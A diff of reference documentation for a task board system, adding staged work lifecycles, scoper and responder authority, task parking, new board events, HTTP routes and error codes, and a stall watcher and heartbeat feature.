+  "<text>"`). Other exits fail legacy tasks (`exited <code>` or `killed by
+  <signal>`) and release staged work. `run` releases on Ctrl-C (exit 130)
+  or a supervisor's SIGTERM (143), and otherwise exits with the command's
+  code. The command gets
   `BOARD_TASK=<id>`, so `vb reply "$BOARD_TASK" "…"` works inside it. It
   renews at a third of the lease the board gave. A renewal that answers
   `claim_lost` stops the command, and `run` exits 1 saying so. A command that
@@ -4114,14 +4292,12 @@ end the lease, complete the task, or release its dependents.
   close one: what the task keeps was checked when it was added. So the board
   walks what the added ones need, up to 500 tasks, and refuses a change it
   would have to walk further for; one that only drops some walks nothing. It
-  follows no completed task's needs: a task completes only once all it needs
-  has, and none can change its needs after completion. Evidence releases may
-  expire, but completion is final, so nothing behind a completed task is the
-  task being changed, which hasn't completed. Finished work behind a
-  prerequisite, however much, is never in the way, unless the caller can't
-  read the completed task: the walk reads tasks out of sight, so behind one
-  of those it goes on as behind any, and whether a change is too many to
-  check says nothing of whether it completed. In one write the task waits for them (`task.needs_changed`), and
+  stops at a readable, completed legacy task: that completion is final, so
+  no task can be made to wait for it again. It follows a completed staged
+  task's needs because the task can reopen and make its dependents wait
+  again. It also follows tasks the caller can't read, completed or not, so
+  whether a change is too many to check says nothing about their state. In
+  one write the task waits for them (`task.needs_changed`), and
   `task.ready` follows when they've all completed; with none it's ready. A
   held task stays held, and the same set changes nothing. A claim, a
   completion readying what waited for it, and an unblock each go by what a
@@ -4129,7 +4305,8 @@ end the lease, complete the task, or release its dependents.
 - **A canceled task is no prerequisite.** It can never complete, so naming
   one is 400 `invalid_needs` too, when a task is made and when a thread is
   made one, on every backend: its maker hears at once. A failed task is one,
-  since `reopen` can retry it.
+  since `reopen` can retry it. A deleted staged task cannot be added as a
+  prerequisite, even if it reached `done`.
 - **Several tasks are made in one write.** `team.tasks.createMany(channel,
   tasks, { id? })` (`POST /tasks/batch`) starts a thread for each of up to
   100 tasks in one channel: all of them or none, on every backend, and no
@@ -4328,17 +4505,19 @@ token }` and `replaces: Ref`. The board authors the ID and `by`, and records the
 task's epoch; it doesn't store the claim secret.
 
 `commit` is an immutable full lowercase SHA-1 or SHA-256 object ID supplied by
-the requester. The board checks the string, not Git. There is no lifecycle on
-this board, no generation, and no check against a lifecycle-recorded commit.
-This receipt cannot certify that a commit exists or is still current in a
-repository. Lifecycle integration must bind the recorded commit and generation
-when that contract exists.
+the requester. The board checks the string, not Git. Staged work does not record a commit
+or generation, so this receipt cannot certify that a commit exists or is
+still current in a repository. Binding a recorded commit and generation is
+separate work.
 
 `team.tasks.answer(id, requestId, { option, commit })` takes effect only on the
 current pending request with the named commit, unchanged epoch and revisions,
 and server time strictly before expiry. `resume` uses the current prerequisites
 to route to `ready` or `waiting` and does not restore the lease. `fail` routes to
 `failed` with the option's consequence as its reason; dependents stay waiting.
+For staged work, a request can only open before handoff or in `repair`, and
+all options must resume work. An answer clears the hold but cannot change the
+stage or skip scope. Canceling or rejecting staged work closes the request.
 The board writes the route and its receipt in the same event. `AttentionView`
 adds `{ id, by, status }` to the draft. Status is `pending`, `stale`, `canceled`,
 or `answered`. Only `answered` adds an `AttentionReceipt`: `{ option, by, at,
@@ -4353,14 +4532,23 @@ A pending or stale structured hold cannot be lifted with legacy `unblock`
 
 To opt in, configure the authority with
 `local({ attentionResponders: { work: ['vercel:user:u_ada'] } })`. Keys match
-exact channels; there are no subtree or wildcard roles. All three routes need
-effective `read` (404 if the task can't be read). Answering additionally needs
-`post` and a verified person acting as themselves, without a profile, whose
-principal ID is in that channel's list (403 `forbidden` otherwise). The
+exact channels, with `*` for all channels. All three routes need effective
+`read` (404 if the task can't be read). Answering additionally needs `post`
+and a verified person acting as themselves, without a profile, whose
+principal ID is in the channel's list or `*` (403 `forbidden` otherwise). The
 board's in-process self caller, deployments, watchers, and synced authors
 can't answer. A person authenticated by a configured local issuer is distinct
 from the board's self caller. Replies and labels don't apply answers; only the
 answer route does. Don't give an agent a responder's credential.
+
+`vb serve --swarm` lists the local owner under `*`, turns on agent ops,
+and adds `politburo: 1` to discovery. Local boards already enforce task authority.
+The flag cannot be used with `--team-tokens`.
+
+`vb serve --responder <principal>` adds a principal to `*`. Repeat the flag to
+list more people. Without `--swarm`, only the listed principals can answer;
+`--responder` does not enable agent ops or grant channel access. With
+`--team-tokens`, a person's principal is `team:user:<handle>`.
 
 Configured local authorities advertise `Discovery.task_attention: true`;
 `http()` forwards requests to the authority. An unconfigured local authority,
@@ -4381,11 +4569,13 @@ the existing `blocked` state and label, but is separate from `block` and
 
 A `waiting`, `ready`, or `claimed` task can be parked. Parking records its
 previous state and revokes any lease in the same write. Unparking rechecks
-prerequisites and returns the task to `waiting` or `ready`, never to the old
-claim. Parking an already parked task or unparking an unparked nonterminal task
-changes nothing. A legacy block cannot be parked over. Canceling or deleting
-the task still ends it. A park affects only that task, not its channel or
-board.
+prerequisites and never restores the old claim. Staged work stays waiting
+unless its stage permits a claim and its prerequisites are complete. A root
+edit or another nonterminal stage move does not lift a park. A terminal
+stage clears it. Parking an already parked task or unparking an unparked
+nonterminal task changes nothing. A plain block cannot be parked over.
+Canceling or deleting the task still ends it. A park affects only that task,
+not its channel or board.
 
 ### `vb tasks`
 
@@ -4407,7 +4597,9 @@ vb tasks handoff <id> <commit> <packet-path> <sha256> [--supersedes <id>]
 vb tasks ask <id> --file <path>
 vb tasks attention <id>
 vb tasks answer <id> <request-id> <option> --commit <sha>
-vb tasks reopen <id>
+vb tasks scope <id> "<reason>"
+vb tasks stage <id> <stage> "<reason>"
+vb tasks reopen <id> ["<reason>"]
 vb tasks assign <id> (<profile> | --pool)
 vb tasks needs <id> (<id>... | --none)
 vb tasks show <id>
@@ -4473,8 +4665,9 @@ task: {
   parked?: { reason: string, by: Author, previous: 'waiting' | 'ready' | 'claimed' } | null
   handoff?: { id: string, commit: string, packetPath: string, sha256: string, supersedes?: string, by: Author, at: string, generation: number } | null
   attentionId?: Ref                                                         // current request ID; details come from the attention route
-  result: string | null                                                      // when completed
+  result: string | null                                                      // on completion or handoff
   reason: string | null                                                      // when failed or canceled
+  work?: { stage: WorkStage, scopedRevision: number | null }                  // on staged work only
 }
 ```
 
@@ -4488,15 +4681,15 @@ Task changes are board facts, in the board log:
 
 ```ts
 // Each carries `thread`, its root's thread key, beside `id`, as every by-ID event does: lanes go by it.
-'task.created':   z.object({ id: MessageId, thread, needs: z.array(MessageId), for: ActorId.nullable(), priority: TaskPriority.optional(), by: Author }), // the thread at `id` is a task; by.principal owns it
+'task.created':   z.object({ id: MessageId, thread, needs: z.array(MessageId), for: ActorId.nullable(), priority: TaskPriority.optional(), by: Author, work: z.literal('proposed').optional() }), // the thread at `id` is a task; by.principal owns it
 'task.assigned':  z.object({ id, thread, for: ActorId.nullable(), by }),             // null: back to the pool
 'task.priority_changed': z.object({ id, thread, priority: TaskPriority, epoch: Epoch.optional(), by }), // optional claim epoch
-'task.needs_changed': z.object({ id, thread, needs: z.array(MessageId), by }),       // what it waits for now, in place of what it waited for
+'task.needs_changed': z.object({ id, thread, needs: z.array(MessageId), by }),       // new needs, or the same needs after a prerequisite reopens (by the board)
 'task.ready':     z.object({ id, thread }),                                          // (server) every prerequisite has completed
 'task.claimed':   z.object({ id, thread, epoch, pauseEpoch: z.number().int().nonnegative().optional(), until, token, by, binding: TaskBinding.optional() }), // token hash stays private; absent pauseEpoch means zero
 'task.renewed':   z.object({ id, thread, epoch, until, by }),
-'task.released':  z.object({ id, thread, epoch, by }),
-'task.expired':   z.object({ id, thread, epoch }),                                   // (server) its lease ran out
+'task.released':  z.object({ id, thread, epoch, by, waiting: z.boolean().optional() }),
+'task.expired':   z.object({ id, thread, epoch, waiting: z.boolean().optional() }),  // (server) its lease ran out
 'task.completed': z.object({ id, thread, epoch, result: TaskNote.nullable(), by }),  // a result or reason is up to 1000 characters
 'task.failed':    z.object({ id, thread, epoch, reason: TaskNote, by }),
 'task.blocked':   z.object({ id, thread, kind: TaskHoldKind.nullable(), reason: TaskNote, by }), // kind `edited`: the board's, `by` whoever edited the root
@@ -4505,14 +4698,16 @@ Task changes are board facts, in the board log:
 'task.unparked':  z.object({ id, thread, reason: TaskNote, by }),
 'task.handoff':   z.object({ id, thread, handoff: TaskHandoff }),
 'task.canceled':  z.object({ id, thread, reason: TaskNote, by }),                    // reason `deleted` when its root was
-'task.reopened':  z.object({ id, thread, by }),
+'task.reopened':  z.object({ id, thread, by, waiting: z.literal(true).optional() }),
+'task.stage_changed': z.object({ id, thread, from: WorkStage, to: WorkStage, reason: TaskNote, by: Author, result: TaskNote.nullable().optional() }), // result on handoff only
 ```
 
 `task.attention_requested` records the draft, request ID, author and task epoch
 and ends any claim. `task.attention_answered` records the answer receipt and
 routes the task in the same fold. The public event feed includes the receipt;
-message views expose only `task.attentionId`, not the stored request. Claim
-tokens are never included in these events.
+message views expose `task.attentionId` and its recorded `attentionStatus`,
+not the stored request. Read the deadline on the attention route.
+Claim tokens are never included in these events.
 
 - **A task with `needs` is `waiting` from `task.created` until `task.ready`.**
   Each event changes one root, so a fold of one message can't look at
@@ -4524,6 +4719,10 @@ tokens are never included in these events.
   backend's to say, as every length and count of a task is. A request's
   schema checks its shape, and a backend refuses what's over its own limits,
   so on `vercel()` the refusal is Vercel's API's.
+- **An ended claim or a reopened legacy task can return to `waiting`.** The
+  board sets `waiting: true` on `task.released`, `task.expired`, or
+  `task.reopened` when a prerequisite isn't done at the append. Without the
+  flag, eligible work returns to `ready`.
 - **A write a task has moved on from changes nothing in the fold:** an older
   epoch, a finished task, a second `task.created`. The writes refuse first;
   the fold is what holds for whoever folds the log themselves.
@@ -4559,22 +4758,30 @@ tokens are never included in these events.
 | POST | `/tasks/:id/attention` | `requestTaskAttention`: `RequestAttentionBody`. Answers 201 `{ task, attention }` |
 | GET | `/tasks/:id/attention` | `taskAttention`: `{ attention }`, `null` when there is no request |
 | POST | `/tasks/:id/attention/:requestId/answer` | `answerTaskAttention`: `AttentionAnswerBody` (`{ option, commit }`). Answers `{ task, attention }` |
-| POST | `/tasks/:id/reopen` | `{}`: a failed task only |
-| POST | `/tasks/:id/assign` | `{ for: ActorId \| null }`: one of the owner's actors, or the pool |
-| POST | `/tasks/:id/needs` | `{ needs: MessageId[] }`: what the task waits for now, in place of what it waited for, and none for a task that waits for nothing. Its owner's or `manage`'s, while no one holds it and it isn't finished |
+| POST | `/tasks/:id/scope` | `{ reason, ifVersion }`: as a scoper, pins the current revision and scopes a proposed task |
+| POST | `/tasks/:id/stage` | `{ stage, reason, ifVersion }`: as a scoper, move to `review`, `qa`, `repair`, `approved`, `done`, or `rejected` |
+| POST | `/tasks/:id/reopen` | `{ reason?, ifVersion? }`: retries a legacy failed task with no required fields. Both fields are required to return staged `done` or `rejected` work to `proposed` as a scoper |
+| POST | `/tasks/:id/assign` | `{ for: ActorId \| null }`: one of the owner's actors, or the pool. A scoper on staged work, before handoff or in `repair` and with no live claim |
+| POST | `/tasks/:id/needs` | `{ needs: MessageId[] }`: replaces the prerequisites, while no one holds the task and it isn't finished. Its owner or `manage` on legacy work; a scoper on staged work, before handoff or in `repair` |
 | POST | `/tasks/:id/priority` | `{ priority, epoch?, token? }`: set the priority of an open task. Takes owner or `manage`, or both claim fields to lower it through a live claim |
-| POST | `/tasks/:id/cancel` | `{ reason }`: any task that hasn't completed or been canceled; a claimed one's claim ends |
+| POST | `/tasks/:id/cancel` | `{ reason }`: a legacy task that hasn't completed or been canceled, or nonterminal staged work as a scoper; any claim ends |
 
 A task reads like the thread it is: `GET /messages/:id`. `lease` and `wait`
 are seconds, as `/events`'s `wait` is: a `wait` of at most 300, and a lease as
 long as the backend gives (the local board takes 30 to 3600). Errors: 404
-`not_a_task` for a thread that isn't one; 403 `forbidden` (a claim without `label`), `task_not_owned`, and `priority_raise_forbidden`; 409
-`task_claimed`, `task_assigned`, `task_waiting`, `task_blocked`, `task_finished`,
-`already_a_task`, `board_paused` (see [Network pause](#network-pause)),
-`claim_lost`, `binding_mismatch`, and `handoff_conflict`; 400 `invalid_needs`,
-`invalid_from`, `invalid_request` for malformed assignment or packet metadata,
-and `reserved_label`; 501 `no_tasks` on a board that keeps none, or
-`no_task_authority` on Vercel's board for parking, bound claims, and handoffs.
+`not_a_task` for a thread that isn't one; 403 `forbidden` (a claim without
+`label`, or a staged operation without scoper authority), `task_not_owned`,
+and `priority_raise_forbidden`; 409 `task_claimed`, `task_assigned`,
+`task_waiting`, `task_blocked`, `task_finished`, `already_a_task`, `claim_lost`,
+`board_paused` (see [Network pause](#network-pause)), `binding_mismatch`,
+`handoff_conflict`, `invalid_task_stage`, `task_version_conflict`,
+`work_lifecycle_required`, `attention_required`, and `attention_stale`;
+400 `invalid_needs`, `invalid_from`, `invalid_request` (including malformed
+assignment or packet metadata), and `reserved_label`; 501 `no_tasks` on a
+board that keeps none, `no_work_lifecycle` when stages aren't available,
+`no_access_fence` when staged-scoper writes cannot be made atomic with grant
+changes, `no_task_attention` without structured attention, and `no_task_authority` on
+Vercel's board for parking, bound claims, and handoffs.
 
 ### Tasks and sync
 
@@ -4646,7 +4853,19 @@ and `reserved_label`; 501 `no_tasks` on a board that keeps none, or
 - **A backend that keeps no tasks** answers 501 `no_tasks`, which the kit
   reports as not kept here.
 
-### Conformance (`tasks`)
+### Conformance (`tasks` and `work-lifecycle`)
+
+On a board that advertises `workLifecycle: 1`, the `work-lifecycle` group
+replaces the legacy queue checks. With `accessFence: 1`, it also runs the
+priority, parking, bound claim, and handoff checks on staged tasks. Use an
+allowlisted scoper with `manage` to check the authorized moves. Pass a
+separate scoper handle in `principals.scoper` and its project ID in
+`principals.project` to check that a revoked grant prevents scope and stage,
+including when scope races the revoke.
+
+Without `accessFence: 1`, the kit checks for 501 `no_access_fence` and
+skips checks that need a staged move. That includes the staged forms of the
+structured attention, run health, and network pause checks.
 
 - A new task is its thread: `read` shows its root with `task`, a reply
   lands in that thread, and `board.task=ready` finds it.
@@ -4803,6 +5022,30 @@ Follow-ups: wire a lease-aware executor to the harnesses; enforce limits in
 an isolated checkout, meter token usage, and run real verification; persist
 budget reservations and provider incidents across processes; expose the
 scoreboard and incidents in the operator console.
+
+### Stall watcher and heartbeat
+
+`stallWatcher()` and `heartbeat()` in `@remilia/politburo-runtime` do not wake
+or stop agents or change task state. `heartbeat()` updates the registry by
+calling `agents.heartbeat` on a grid of `everyMinutes` shifted by
+`offsetMinutes`, so agents with different offsets beat at different times.
+
+`stallWatcher().check()` reads the feed and the channel's registry. It returns
+`quiet` after `quietMinutes` (30 by default) without a newer feed event or
+heartbeat from an enabled agent, using board timestamps and starting at
+watcher creation. It reports an enabled agent as `missed` when its heartbeat
+is older than twice its period, even if the feed is active. Without a
+heartbeat, age starts at watcher creation for agents seen on the first check,
+or at the check that first sees the agent or a generation change otherwise.
+A `quiet` result can include missed agents.
+
+The watcher sends operational inbox mail to the configured agent or role.
+One check can send several topics: `stall:quiet:<channel>` for board silence
+and `stall:missed:<channel>:<id>` for each late agent. If it sees a pause, it
+returns `paused` and stops sending. A successful send is deduplicated for one
+watcher instance until a check sees that topic recover. A lost send response can cause
+a later check to repeat the message. The board infers no liveness: a board-side
+missed-heartbeat fact does not exist.
 
 ## Agent registry
 
@@ -4997,7 +5240,7 @@ report attests to what the harness observes, not to the runtime itself.
 | Who may work a task? | **Anyone with `label` in its channel.** A task's state is its root's `board.task` label, so working it changes a thread's state, which `label` grants; `post` only says things, and broad `post` grants are common. Its owner, or `manage`, keeps the rest: assigning, holding, reopening, canceling. Agents take others' tasks only with `--from`, so a teammate's text steers no one by accident. |
 | Who decides how tasks behave? | **board.** It specs them and the conformance kit's `tasks` group checks them; Vercel's API conforms check by check, as it did for label `if`, reply `after`, and `revision`. |
 | How do tasks live in Vercel's API? | **On its threads.** A thread carries the task's state, and its changes are thread events, as on `local()`. Tying a thread to the task records that API already had would keep the same facts in two places (text, state, existence, channel, events), each needing a rule to stay equal. Those tasks stay as they are for the tools that call them, and aren't board tasks. |
-| What happens when a lease runs out? | **The next task request writes it.** Nothing is armed for a claim: a lapsed claim is claimable at once, and `task.expired` lands with the next claim, `claim --ready`, or list that sees it. `local()` also times it in its own process. A worker that only wakes on events asks on a schedule too. |
+| What happens when a lease runs out? | **A lapsed lease holds nothing.** A task with completed prerequisites can be taken over at once, with `task.expired` before the new claim. `local()` also times expiry in its own process. A worker that only wakes on events asks on a schedule too. |
 | Can watchers be added at runtime? | **No: the dynamic part is data.** A registration carries no code: a deployment registers the tails of the watchers it deployed, and its own `https` URL or path, which the board wakes with no event and no credential (see [Watchers woken by their board](#watchers-woken-by-their-board)). A watcher reads labels and mentions instead (see [Watchers](#watchers)). |
 
 ## Benchmarks before release
